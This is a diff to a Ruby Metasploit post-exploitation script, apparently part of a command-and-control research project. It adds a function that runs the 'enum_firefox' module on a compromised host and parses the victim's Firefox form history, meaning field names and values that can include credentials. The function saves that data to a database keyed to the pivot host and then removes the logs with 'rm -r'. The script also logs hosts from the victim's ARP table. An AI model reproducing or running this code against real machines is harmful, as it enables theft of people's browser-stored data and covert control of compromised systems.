@@ -86,11 +86,39 @@ def write_db host
   if session.framework.db.active
     session.framework.db.report_host host
   end
-
 end
+
+#save frfx formular data in db
+#todo require '~/fidius2/candc/app/models/frfx_form.rb'
+#todo integrate in candc
+def save_frfx_forms hostID, newRun = false, clear = true
+  if newRun
+    client.run_cmd("run enum_firefox")
+  end
+  frfxLogPath = ENV['HOME'] + "/.msf3/logs/scripts/enum_firefox/"
+  
+  arr = Array.new
+  Dir.foreach(frfxLogPath) { |x| 
+    arr << x
+  }
+ 
+  frfxLogDir =  frfxLogPath + arr.sort.last 
+  
+  File.open(frfxLogDir + "/main_form_history.txt") do |file|
+    file.each do |line|
+      lineArray = line.split
+      FrfxForm.new(:host_id=>hostID,:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
+    end
+  end
+  if clear 
+    system 'rm -r ' + frfxLogDir
+  end
+end  
 
 write_db get_host_infos
 
 get_arp_a_infos.each do |host|
   write_db host
 end
+
+save_frfx_forms $pivot[:id], true
